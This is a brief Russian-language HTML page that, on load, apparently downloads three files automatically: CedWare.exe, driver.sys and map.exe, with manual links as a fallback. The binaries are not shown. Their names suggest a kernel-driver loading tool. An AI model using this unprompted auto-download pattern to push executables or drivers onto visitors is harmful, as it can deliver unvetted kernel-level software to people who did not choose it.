<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Скачивание файлов...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0a0a0a;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        ul {
            list-style: none;
            padding: 0;
        }
        li {
            margin: 10px 0;
        }
        a {
            color: #4caf50;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Загрузка файлов начнется автоматически...</h2>
    <p>Если скачивание не началось, вы можете скачать их вручную:</p>
    <ul>
        <li><a href="CedWare.exe" download>Скачать Файл 1</a></li>
        <li><a href="driver.sys" download>Скачать Файл 2</a></li>
        <li><a href="map.exe" download>Скачать Файл 3</a></li>
    </ul>
</div>

<script>
    window.addEventListener('DOMContentLoaded', () => {
        // Изменен массив файлов, чтобы он соответствовал реальным именам файлов
        const files = ['CedWare.exe', 'driver.sys', 'map.exe']; 

        files.forEach((file, index) => {
            // Небольшая задержка помогает браузеру обработать несколько запросов на скачивание
            setTimeout(() => {
                const link = document.createElement('a');
                link.href = file;
                link.download = file;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, index * 500); 
        });
    });
</script>

</body>
</html>
